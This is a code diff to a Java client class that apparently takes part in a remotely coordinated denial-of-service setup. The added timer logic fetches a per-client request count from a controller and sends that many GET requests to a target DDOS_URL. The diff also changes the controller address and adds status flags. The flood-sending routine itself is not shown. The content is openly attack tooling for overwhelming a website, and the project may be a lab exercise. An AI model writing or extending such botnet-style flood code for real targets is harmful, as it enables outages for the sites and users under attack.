@@ -33,6 +33,10 @@ public class ClientConnection {
     static boolean isgetCountCalculated;
     static boolean isCountFirstRun;
     
+    //regarding to perCliedProposedDDOSCount
+    static boolean isGETCompleted=false;
+    static boolean sendGetFuncRan=false;
+    
     
     public static void main(String[] args) {
         initGlobalVariables();
@@ -43,7 +47,7 @@ public class ClientConnection {
     private static void setClient(){
         
         CallHandler callHandler = new CallHandler();
-        String remoteHost = "192.168.1.4";
+        String remoteHost = "172.20.8.65";//"192.168.1.4";
         int portWasBinded = 58882;
         
         Client client=null;
@@ -109,6 +113,13 @@ public class ClientConnection {
       
       
       
+       
+      
+      
+      
+      
+      
+      
       //Timers
       private static void setTimerToCheckURLAvailability(){
           Timer timer = new Timer();
@@ -116,6 +127,20 @@ public class ClientConnection {
               @Override
               public void run() {
                   System.out.println(">>>>>>>>URLAvailability ran");
+                  
+                  if(!isGETCompleted && isgetCountCalculated){
+                      
+                  int _DDOSCountForThisClient=0;
+                  _DDOSCountForThisClient=ClientControllerCon.takeNumOfDDOSToBeExcecuted();
+                  if(_DDOSCountForThisClient!=0) {
+                      if(!GETRequestHandlers.sendGets(DDOS_URL, _DDOSCountForThisClient))
+                      {System.out.println("Sending gets to the DDOS URL Failed");
+                      isGETCompleted=true;}
+                      else  isGETCompleted=true;
+                  }
+                  
+                  }
+                  
                   if(!checkURLAvailable()) {
                       System.out.println("-------------------------------------------");
                       
@@ -161,6 +186,20 @@ public class ClientConnection {
           timer.schedule(myTask, 1000, 1000);
       }
       
+      //////////
+      private static void setTimerToGetTheDDOSCount(){
+          Timer timer = new Timer();
+          TimerTask myTask = new TimerTask() {
+              @Override
+              public void run() {
+                 
+              }
+          };
+
+          timer.schedule(myTask, 1000, 1000);
+      }
+      //////////
+      
       
       private static void countNumOfConPerSec(){
          
@@ -187,6 +226,8 @@ public class ClientConnection {
             getCount=0;
             isgetCountCalculated=false;
             isCountFirstRun=true;
+            isGETCompleted=false;
+            sendGetFuncRan=false;
     
       }
       
